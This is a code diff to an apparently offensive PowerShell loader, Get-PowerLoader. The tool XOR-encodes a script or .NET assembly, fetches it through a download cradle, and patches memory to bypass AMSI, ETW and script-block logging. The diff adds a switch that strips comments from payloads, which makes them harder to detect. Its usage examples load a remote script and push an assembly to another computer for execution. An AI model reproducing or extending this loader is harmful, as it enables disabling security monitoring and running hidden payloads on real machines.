@@ -23,11 +23,14 @@ function Get-PowerLoader {
 .PARAMETER Bypass
     Specifies the bypass techniques to include.
 
+.PARAMETER ClearComments
+    Removes comments from PowerShell payload to be loaded.
+
 .EXAMPLE
     PS C:\> Get-PowerLoader -Type PoSh -FileUrl 'https://192.168.0.1/script.ps1' -ArgumentList 'Invoke-Sample','-Verbose' -Bypass AMSI,SBL
 
 .EXAMPLE
-    PS C:\> Get-PowerLoader -Type NetAsm -FilePath .\sharp.exe -Bypass ETW | Invoke-PowerExec -ComputerList 192.168.0.2
+    PS C:\> Get-PowerLoader -Type NetAsm -FilePath .\sharp.exe -Bypass AMSI,ETW | Invoke-PowerExec -ComputerList 192.168.0.2
 #>
     [CmdletBinding()]
     Param (
@@ -48,12 +51,18 @@ function Get-PowerLoader {
 
         [ValidateSet("AMSI","ETW","SBL")]
         [string[]]
-        $Bypass
+        $Bypass,
+
+        [Switch]
+        $ClearComments
     )
 
     $srcCode = ${function:Get-DecodedBytes}.Ast.Extent.Text + [Environment]::NewLine
     if ($FilePath) {
         $bytes = [IO.File]::ReadAllBytes((Resolve-Path $FilePath))
+        if ($ClearComments -and $Type -eq "PoSh") {
+            $bytes = Remove-PoshComments($bytes)
+        }
         $bytes = $bytes | foreach {$_ -bxor 1}
         $encCode = Get-EncodedBytes($bytes)
         $srcCode += '$code = Get-DecodedBytes("' + $encCode + '") | foreach {$_ -bxor 1}' + [Environment]::NewLine
@@ -64,6 +73,10 @@ function Get-PowerLoader {
         $bytes = $bytes | foreach {$_ -bxor 1}
         $encUrl = Get-EncodedBytes($bytes)
         $srcCode += '$code = Invoke-DownloadCradle([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("' + $encUrl + '") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+        if ($ClearComments -and $Type -eq "PoSh") {
+            $srcCode += ${function:Remove-PoshComments}.Ast.Extent.Text + [Environment]::NewLine
+            $srcCode += '$code = Remove-PoshComments($code)' + [Environment]::NewLine
+        }
     }
     else {
         Write-Error "Either FilePath or FileUrl parameter must be specified" -ErrorAction Stop
@@ -117,8 +130,24 @@ function Get-PowerLoader {
     return [ScriptBlock]::Create($script)
 }
 
+function Local:Remove-PoshComments {
+    Param (
+        [byte[]] $Bytes
+    )
+
+    $strBytes = [BitConverter]::ToString($Bytes)
+    $strBytes = $strBytes -replace "3C-23-(.*?)-23-3E"
+    $strBytes = $strBytes -replace "23-(.*?)-0A","0A"
+    $strBytes = $strBytes -replace "-"
+    $byteArray = New-Object Byte[] ($strBytes.Length / 2)
+    for ($i = 0; $i -lt $strBytes.Length; $i += 2) {
+        $byteArray[$i/2] = [convert]::ToByte($strBytes.Substring($i, 2), 16)
+    }
+    return $byteArray
+}
+
 function Local:Get-EncodedBytes {
-    Param(
+    Param (
         [Parameter(Mandatory = $True)]
         [byte[]] $ByteArray
     )
@@ -133,7 +162,7 @@ function Local:Get-EncodedBytes {
 }
 
 function Local:Get-DecodedBytes {
-    Param(
+    Param (
         [Parameter(Mandatory = $True)]
         [string] $EncBytes
     )
@@ -173,7 +202,7 @@ public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint 
     $b = 0
     [Win32]::VirtualProtect($address, [UInt32]$Patch.Length, 0x40, [ref]$a) | Out-Null
     try {
-        [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $address, [UInt32]$Patch.Length)
+        [Runtime.InteropServices.Marshal]::Copy($Patch, 0, $address, [UInt32]$Patch.Length)
     }
     catch {
         Write-Error "Memory patch failed."
